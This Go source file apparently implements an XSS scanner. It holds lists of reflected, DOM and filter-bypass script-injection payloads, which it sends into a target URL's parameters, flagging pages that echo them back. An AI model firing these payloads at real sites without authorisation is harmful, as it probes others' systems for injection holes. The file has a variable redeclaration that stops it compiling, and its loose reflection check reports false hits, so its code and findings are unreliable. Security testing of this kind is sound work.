package scanner

import (
	"io"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"

	"github.com/briandowns/spinner"
	"github.com/fatih/color"
)

const (
	httpMethodPOST = "POST"
)

type XSSConfig struct {
	URL     string
	Method  string
	Data    string
	Params  []string
	Headers []string
	Timeout time.Duration
	Threads int
}

type XSSResult struct {
	URL       string
	Parameter string
	Payload   string
	Type      string // reflected, stored, dom
	Evidence  string
	RiskLevel string
}

type XSSScanner struct {
	config  XSSConfig
	client  *http.Client
	results []XSSResult
	mutex   sync.Mutex
}

var xssPayloads = map[string][]string{
	"reflected": {
		"<script>alert('XSS')</script>",
		"<img src=x onerror=alert('XSS')>",
		"<svg onload=alert('XSS')>",
		"javascript:alert('XSS')",
		"'><script>alert('XSS')</script>",
		"\"><script>alert('XSS')</script>",
		"<iframe src=javascript:alert('XSS')>",
		"<body onload=alert('XSS')>",
		"<input onfocus=alert('XSS') autofocus>",
		"<select onfocus=alert('XSS') autofocus>",
		"<textarea onfocus=alert('XSS') autofocus>",
		"<keygen onfocus=alert('XSS') autofocus>",
		"<video><source onerror=alert('XSS')>",
		"<audio src=x onerror=alert('XSS')>",
	},
	"dom": {
		"#<script>alert('DOM_XSS')</script>",
		"#<img src=x onerror=alert('DOM_XSS')>",
		"javascript:alert('DOM_XSS')",
		"data:text/html,<script>alert('DOM_XSS')</script>",
	},
	"filter_bypass": {
		"<ScRiPt>alert('XSS')</ScRiPt>",
		"<script>alert(String.fromCharCode(88,83,83))</script>",
		"<img src=\"javascript:alert('XSS')\">",
		"<img src=javascript:alert(&quot;XSS&quot;)>",
		"<img src=`x`onerror=alert('XSS')>",
		"<img src=x onerror=`alert('XSS')`>",
		"<svg/onload=alert('XSS')>",
		"<iframe srcdoc=\"<script>alert('XSS')</script>\">",
	},
}

func NewXSSScanner(config XSSConfig) *XSSScanner {
	return &XSSScanner{
		config: config,
		client: &http.Client{
			Timeout: config.Timeout,
		},
		results: make([]XSSResult, 0),
	}
}

func (x *XSSScanner) GetConfig() XSSConfig {
	return x.config
}

func (x *XSSScanner) GetClient() *http.Client {
	return x.client
}

func (x *XSSScanner) Scan() []XSSResult {
	x.results = make([]XSSResult, 0)

	sp := spinner.New(spinner.CharSets[14], 100*time.Millisecond)
	sp.Start()
	defer sp.Stop()

	parsedURL, err := url.Parse(x.config.URL)
	if err != nil {
		color.Red("Error parsing URL: %v", err)
		return x.results
	}

	var wg sync.WaitGroup
	semaphore := make(chan struct{}, x.config.Threads)

	if len(x.config.Params) == 0 {
		for param := range parsedURL.Query() {
			x.config.Params = append(x.config.Params, param)
		}

		if x.config.Method == httpMethodPOST && x.config.Data != "" {
			formData, err := url.ParseQuery(x.config.Data)
			if err == nil {
				for param := range formData {
					x.config.Params = append(x.config.Params, param)
				}
			}
		}
	}

	if len(x.config.Params) == 0 {
		color.Yellow("⚠️  No parameters detected. Trying common parameter names...")
		x.config.Params = []string{"q", "search", "query", "comment", "message", "name", "email", "content"}
	}

	for _, payloadType := range []string{"reflected", "dom", "filter_bypass"} {
		for _, param := range x.config.Params {
			for _, payload := range xssPayloads[payloadType] {
				wg.Add(1)
				go func(param, payload, payloadType string) {
					defer wg.Done()
					semaphore <- struct{}{}
					defer func() { <-semaphore }()

					x.testPayload(param, payload, payloadType)
				}(param, payload, payloadType)
			}
		}
	}

	wg.Wait()
	return x.results
}

func (x *XSSScanner) testPayload(param, payload, payloadType string) {
	parsedURL, err := url.Parse(x.config.URL)
	if err != nil {
		return
	}

	var req *http.Request
	var err error

	if x.config.Method == "GET" {
		query := parsedURL.Query()
		query.Set(param, payload)
		parsedURL.RawQuery = query.Encode()

		req, err = http.NewRequest("GET", parsedURL.String(), nil)
	} else if x.config.Method == httpMethodPOST {
		var postData string
		if x.config.Data != "" {
			formValues, err := url.ParseQuery(x.config.Data)
			if err != nil {
				return
			}
			formValues.Set(param, payload)
			postData = formValues.Encode()
		} else {
			postData = url.Values{param: {payload}}.Encode()
		}

		req, err = http.NewRequest("POST", x.config.URL, strings.NewReader(postData))
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	}

	if err != nil {
		return
	}

	for _, header := range x.config.Headers {
		parts := strings.SplitN(header, ":", 2)
		if len(parts) == 2 {
			req.Header.Set(strings.TrimSpace(parts[0]), strings.TrimSpace(parts[1]))
		}
	}

	resp, err := x.client.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return
	}

	bodyStr := string(body)

	x.analyzeResponse(param, payload, payloadType, bodyStr)
}

func (x *XSSScanner) analyzeResponse(param, payload, payloadType string, body string) {
	var vulnerability *XSSResult

	if x.isPayloadReflected(payload, body) {
		vulnerability = &XSSResult{
			URL:       x.config.URL,
			Parameter: param,
			Payload:   payload,
			Type:      payloadType,
			Evidence:  "Payload reflected in response without proper encoding",
			RiskLevel: x.getRiskLevel(payload),
		}
	}

	if vulnerability != nil {
		x.mutex.Lock()
		x.results = append(x.results, *vulnerability)
		x.mutex.Unlock()
	}
}

func (x *XSSScanner) IsPayloadReflected(payload, body string) bool {
	return x.isPayloadReflected(payload, body)
}

func (x *XSSScanner) isPayloadReflected(payload, body string) bool {
	bodyLower := strings.ToLower(body)
	payloadLower := strings.ToLower(payload)

	if strings.Contains(bodyLower, payloadLower) {
		return true
	}

	dangerousPatterns := []string{
		"<script",
		"javascript:",
		"onerror",
		"onload",
		"onfocus",
		"<iframe",
		"<img",
		"<svg",
	}

	for _, pattern := range dangerousPatterns {
		if strings.Contains(payloadLower, pattern) && strings.Contains(bodyLower, pattern) {
			return true
		}
	}

	return false
}

func (x *XSSScanner) GetRiskLevel(payload string) string {
	return x.getRiskLevel(payload)
}

func (x *XSSScanner) getRiskLevel(payload string) string {
	if strings.Contains(strings.ToLower(payload), "script") {
		return "High"
	}
	if strings.Contains(strings.ToLower(payload), "javascript:") {
		return "High"
	}
	if strings.Contains(strings.ToLower(payload), "onerror") || strings.Contains(strings.ToLower(payload), "onload") {
		return "Medium"
	}
	return "Low"
}
